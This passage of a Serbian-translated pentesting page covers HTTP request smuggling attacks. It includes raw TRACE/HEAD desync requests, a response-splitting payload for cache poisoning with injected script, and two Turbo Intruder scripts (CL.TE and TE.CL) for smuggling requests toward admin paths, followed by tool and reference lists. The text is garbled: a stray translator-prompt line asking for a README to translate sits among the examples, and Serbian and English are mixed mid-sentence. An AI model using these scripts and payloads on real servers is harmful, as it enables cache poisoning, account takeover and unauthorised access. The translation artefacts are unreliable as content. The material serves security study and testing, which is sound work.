### Zloupotreba TRACE putem HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In this post**](https://portswigger.net/research/trace-desync-attack) se sugeriše da, ako server ima omogućenu metodu TRACE, može biti moguće zloupotrebiti je pomoću HTTP Request Smuggling. To je zato što će ova metoda vratiti svaki header poslat serveru kao deo tela odgovora. Na primer:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Pošaljite sadržaj fajla src/pentesting-web/http-request-smuggling/README.md koji želite da prevedem na srpski.
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Primer kako zloupotrebiti ovo ponašanje bio bi da **smuggle first a HEAD request**. Ovaj request će biti odgovorен samo sa **headers** of a GET request (**`Content-Type`** among them). I **smuggle immediately after the HEAD a TRACE request**, koje će biti **reflecting the sent dat**a.\
Pošto HEAD response sadrži `Content-Length` header, **response of the TRACE request will be treated as the body of the HEAD response, therefore reflecting arbitrary data** u odgovoru.\
Ovaj response će biti poslat sledećem request-u preko konekcije, pa ovo može biti **used in a cached JS file for example to inject arbitrary JS code**.

### Abusing TRACE via HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Nastavak praćenja [**this post**](https://portswigger.net/research/trace-desync-attack) predlaže još jedan način zloupotrebe TRACE method. Kao što je komentarisano, smuggling HEAD request-a i TRACE request-a omogućava **control some reflected data** u odgovoru na HEAD request. Dužina tela HEAD request-a je u suštini naznačena u `Content-Length` header-u i formira se odgovorom na TRACE request.

Dakle, nova ideja je da, znajući ovaj `Content-Length` i podatke iz TRACE odgovora, moguće je učiniti da TRACE odgovor sadrži validan HTTP response nakon poslednjeg bajta definisanog `Content-Length`-om, omogućavajući napadaču da potpuno kontroliše request za sledeći response (što se može iskoristiti za cache poisoning).

Primer:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Generisaće ove odgovore (primetite kako HEAD odgovor ima Content-Length, što čini TRACE odgovor delom tela HEAD odgovora, i kada Content-Length HEAD odgovora završi, validan HTTP odgovor je smuggled):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### Korišćenje HTTP Request Smuggling-a pomoću HTTP Response Desynchronisation

Pronašli ste neku HTTP Request Smuggling ranjivost i ne znate kako da je iskoristite? Probajte ove druge metode eksploatacije:


{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### Ostale HTTP Request Smuggling tehnike

- Browser HTTP Request Smuggling (Client Side)


{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling in HTTP/2 Downgrades


{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Turbo intruder scripts

### CL.TE

Iz [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Izvor: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Alati

- HTTP Hacker (Burp BApp Store) – za vizuelizaciju concatenation/framing i niskonivnog HTTP ponašanja
- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater Custom Action "Smuggling or pipelining?"
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Ovaj alat je zasnovan na gramatici i predstavlja HTTP Fuzzer koristan za pronalaženje neobičnih request smuggling neslaganja.

## Reference

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- Pazite na lažno lažno-pozitivan rezultat: kako razlikovati HTTP pipelining od request smuggling – [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://http1mustdie.com/](https://http1mustdie.com/)
- Browser‑Powered Desync Attacks – [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- PortSwigger Academy – client‑side desync – [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)


{{#include ../../banners/hacktricks-training.md}}
